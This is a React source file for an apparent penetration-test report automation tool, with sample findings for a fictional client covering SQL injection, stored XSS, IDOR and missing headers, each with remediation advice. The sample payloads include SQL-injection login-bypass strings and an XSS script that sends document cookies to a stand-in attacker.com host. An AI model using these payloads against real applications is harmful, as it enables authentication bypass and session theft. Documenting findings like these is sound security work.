import { useState, useCallback } from 'react'
import Navbar from './components/Navbar'
import Home   from './pages/Home'

const today = () => new Date().toISOString().split('T')[0]

const DEFAULT_META = {
  client_name: '',
  application_name: '',
  application_version: '',
  application_approach: 'Gray Box',
  application_url: [],
  tester_name: '',
  validator_name: '',
  project_id: '',
  assessment_startdate: '',
  assessment_enddate: '',
  report_delivery_date: '',
  basic_document_date: '',
  draft_document_date: '',
  peer_review_date: '',
  reassessment: '30 days',
  outofscope: [],
}

const SAMPLE_FINDINGS = [
  {
    id: 's001', title: 'SQL Injection — Login Form',
    summary: 'Authentication bypass via unsanitized username parameter',
    description: 'The `/api/auth/login` endpoint concatenates user-supplied input directly into the SQL query without parameterization.\n\n```sql\nSELECT * FROM users WHERE username=\'{input}\' AND password=\'{input}\'\n```\n\nThis allows an attacker to inject SQL syntax and bypass authentication entirely.',
    impact: 'Complete database compromise, authentication bypass without valid credentials, and potential Remote Code Execution via database-specific features (e.g., `xp_cmdshell`, `INTO OUTFILE`).',
    recommendation: 'Use parameterized queries or prepared statements for **all** database interactions. Never concatenate user input into SQL strings.\n\n```python\ncursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))\n```',
    cvss: { score: 9.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', level: 'critical' },
    ease: 'Trivial', cwe: 'CWE-89',
    affected_components: ['/api/auth/login', '/api/admin/login'],
    payload: ["' OR 1=1--", "admin'--", "1' UNION SELECT NULL,NULL,NULL--"],
    poc: "POST /api/auth/login HTTP/1.1\nContent-Type: application/json\n\n{\"username\": \"' OR 1=1--\", \"password\": \"test\"}\n\nHTTP/1.1 200 OK — authentication bypassed",
    references: ['https://owasp.org/www-community/attacks/SQL_Injection', 'https://cwe.mitre.org/data/definitions/89.html'],
    validated: true, false_positive: false, source: 'manual',
  },
  {
    id: 's002', title: 'Stored XSS — User Profile Display Name',
    summary: 'Stored script executes on profile view for all users',
    description: 'The user profile display name field accepts HTML without server-side sanitization. The input is persisted to the database and rendered directly in the DOM when other users view the profile.',
    impact: 'Session hijacking of all users who view the profile, credential theft via keyloggers, stored malware distribution, and account takeover at scale.',
    recommendation: 'Sanitize all user input before storage using a server-side HTML sanitizer. Apply context-aware output encoding on display. Implement a strict `Content-Security-Policy` header.',
    cvss: { score: 8.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N', level: 'high' },
    ease: 'Trivial', cwe: 'CWE-79',
    affected_components: ['/api/profile/update', '/profile/{username}'],
    payload: ['<script>fetch("https://attacker.com?c="+document.cookie)</script>', '<img src=x onerror=alert(document.domain)>'],
    poc: '1. Login as attacker → navigate to /profile/settings\n2. Set display name to <script>alert(document.cookie)</script>\n3. Login as victim → view attacker profile\n4. Script executes in victim\'s browser context',
    references: ['https://portswigger.net/web-security/cross-site-scripting/stored'],
    validated: true, false_positive: false, source: 'manual',
  },
  {
    id: 's003', title: 'IDOR — Unauthorized User Data Access',
    summary: 'Missing ownership validation on user profile API',
    description: 'The `/api/users/{id}/profile` endpoint returns sensitive user data without verifying that the authenticated user owns or has permission to access the requested resource.',
    impact: 'Full PII exposure including names, emails, phone numbers, and addresses for all registered users. Regulatory violations (GDPR, PDPA).',
    recommendation: 'Implement server-side ownership validation. Use UUID-based IDs to reduce guessability. Apply the principle of least privilege to all API endpoints.',
    cvss: { score: 7.5, vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N', level: 'high' },
    ease: 'Moderate', cwe: 'CWE-639',
    affected_components: ['/api/users/{id}/profile', '/api/orders/{id}'],
    payload: ['GET /api/users/1001/profile (as user 2000)'],
    poc: 'Authenticated as user_id=2000:\nGET /api/users/1001/profile\nAuthorization: Bearer <valid_token>\n\nHTTP/1.1 200 OK — victim PII returned',
    references: ['https://portswigger.net/web-security/access-control/idor'],
    validated: false, false_positive: false, source: 'manual',
  },
  {
    id: 's004', title: 'Missing Security Headers',
    summary: 'HTTP responses missing recommended security controls',
    description: 'The application is missing several industry-standard security headers that protect against common client-side attacks including XSS, clickjacking, and MIME-type sniffing.',
    impact: 'Increased attack surface for XSS, clickjacking, and information disclosure attacks.',
    recommendation: 'Configure the web server to emit:\n- `Content-Security-Policy: default-src \'self\'`\n- `X-Frame-Options: DENY`\n- `X-Content-Type-Options: nosniff`\n- `Referrer-Policy: strict-origin-when-cross-origin`',
    cvss: { score: 4.3, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N', level: 'medium' },
    ease: 'Trivial', cwe: 'CWE-693',
    affected_components: ['All application responses'],
    payload: [],
    poc: 'curl -I https://target.com\n# No CSP, X-Frame-Options, or X-Content-Type-Options headers in response',
    references: ['https://owasp.org/www-project-secure-headers/', 'https://securityheaders.com'],
    validated: true, false_positive: false, source: 'manual',
  },
]

let _toastId = 0

export default function App() {
  const [page, setPage]           = useState('dashboard')
  const [findings, setFindings]   = useState([])
  const [meta, setMeta]           = useState({ ...DEFAULT_META })
  const [editTarget, setEditTarget] = useState(null)
  const [toasts, setToasts]       = useState([])

  const toast = useCallback((msg, type = 'ok') => {
    const id = ++_toastId
    setToasts(prev => [...prev, { id, msg, type }])
    setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), 3400)
  }, [])

  const loadSample = () => {
    setFindings(SAMPLE_FINDINGS)
    setMeta(prev => ({
      ...prev,
      client_name: 'ACME Corporation',
      application_name: 'Customer Portal',
      application_version: '2.1',
      tester_name: 'Your Name',
      validator_name: 'Vignesh',
      project_id: `IARM-${new Date().getFullYear()}-042`,
    }))
    toast('Sample data loaded ✓')
  }

  const navigateTo = (p) => {
    if (p !== 'editor') setEditTarget(null)
    setPage(p)
  }

  const SEV_COUNTS = findings.reduce((acc, f) => {
    if (!f.false_positive) acc[f.cvss?.level] = (acc[f.cvss?.level] || 0) + 1
    return acc
  }, {})

  return (
    <div className="app-shell">
      {/* ── Top bar ── */}
      <header style={{
        background: 'var(--bg2)',
        borderBottom: '1px solid var(--border)',
        padding: '11px 24px',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between',
        flexShrink: 0,
        zIndex: 10,
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
          <span style={{ color: 'var(--cyan)', fontSize: 18, fontWeight: 700 }}>⬡</span>
          <span style={{ fontFamily: 'Orbitron, sans-serif', fontWeight: 700, color: 'var(--cyan)', fontSize: 12, letterSpacing: 1.5 }}>
            VAPT REPORT AUTOMATION
          </span>
          <span style={{ background: 'var(--cyan-dim)', color: 'var(--cyan)', border: '1px solid var(--cyan)', borderRadius: 4, padding: '1px 8px', fontSize: 9, letterSpacing: 2 }}>
            v2.0
          </span>
        </div>

        <div style={{ display: 'flex', gap: 20, alignItems: 'center', fontSize: 11, color: 'var(--dim)' }}>
          <span>{findings.length} findings</span>
          {meta.client_name && <span style={{ color: 'var(--text)' }}>/ {meta.client_name}</span>}
          {['critical', 'high'].map(s => SEV_COUNTS[s] > 0 && (
            <span key={s} style={{ color: s === 'critical' ? 'var(--sev-critical)' : 'var(--sev-high)', fontWeight: 700 }}>
              {SEV_COUNTS[s]} {s}
            </span>
          ))}
        </div>
      </header>

      <div className="app-body">
        <Navbar
          activePage={page}
          setPage={navigateTo}
          findingCount={findings.length}
          meta={meta}
        />

        <main className="main-content">
          <div style={{ maxWidth: 1100 }}>
            <Home
              page={page}
              setPage={navigateTo}
              findings={findings}
              setFindings={setFindings}
              meta={meta}
              setMeta={setMeta}
              editTarget={editTarget}
              setEditTarget={setEditTarget}
              toast={toast}
              onLoadSample={loadSample}
            />
          </div>
        </main>
      </div>

      {/* ── Toasts ── */}
      <div className="toast-container">
        {toasts.map(t => (
          <div key={t.id} className={`toast ${t.type}`}>{t.msg}</div>
        ))}
      </div>
    </div>
  )
}
